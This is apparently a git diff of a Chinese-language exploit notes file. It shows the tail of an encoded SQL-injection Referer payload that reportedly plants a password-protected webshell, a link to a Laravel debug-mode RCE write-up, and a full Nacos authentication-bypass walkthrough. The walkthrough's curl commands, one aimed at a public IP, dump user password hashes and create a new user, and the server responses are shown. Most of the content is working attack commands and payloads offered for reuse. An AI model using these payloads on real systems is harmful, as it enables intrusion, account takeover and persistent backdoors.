@@ -55,3 +55,91 @@ webshell:
 Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:289:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
 ```
 会在网站根目录生成1.php，密码：1337
+
+
+
+![LARAVEL <= V8.4.2调试模式：远程执行代码](https://www.ambionics.io/blog/laravel-debug-rce)
+
+
+
+
+[nacos绕过身份验证](https://github.com/alibaba/nacos/issues/4593)
+
+漏洞复现
+
+1. 访问用户列表界面
+
+```bash
+curl XGET 'http://47.93.46.78:9090/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
+
+
+curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
+```
+
+此时认证被绕过，并且返回用户列表数据
+
+```json
+{
+    "totalCount": 1,
+    "pageNumber": 1,
+    "pagesAvailable": 1,
+    "pageItems": [
+        {
+            "username": "nacos",
+            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
+        }
+    ]
+}
+```
+
+2. 添加新用户
+
+```bash
+curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test' -H 'User-Agent: Nacos-Server'
+```
+
+此时绕过身份验证，并添加了新用户
+```json
+{
+    "code":200,
+    "message":"create user ok!",
+    "data":null
+}
+```
+
+
+3. 再次查看用户列表
+
+```bash
+curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
+```
+
+此时绕过身份验证成功创建了一个用户。
+
+```json
+{
+    "totalCount": 2,
+    "pageNumber": 1,
+    "pagesAvailable": 1,
+    "pageItems": [
+        {
+            "username": "nacos",
+            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
+        },
+        {
+            "username": "test",
+            "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"
+        }
+    ]
+}
+```
+
+[nacos后台存在注入]
+
+`命名空间 - 操作 - 详情 - 抓包` 1.4,1.3版本 存在该SQL注入漏洞。
+
+
+
+
+
+
